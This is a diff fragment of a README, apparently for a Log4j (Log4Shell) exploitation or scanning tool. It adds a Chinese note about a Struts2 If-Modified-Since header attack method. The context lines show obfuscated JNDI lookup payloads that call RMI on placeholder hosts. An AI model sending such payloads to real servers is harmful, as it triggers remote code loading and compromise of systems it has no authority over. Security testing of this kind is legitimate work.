@@ -16,6 +16,9 @@ ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
 ```
 
+### structs2版本
+添加了structs2静态文件 If-Modified-Since 头利用方式。
+参考：https://mp.weixin.qq.com/s/T-rcZnQxxUK1n2_lJNoUZg
 
 # 使用
 ```
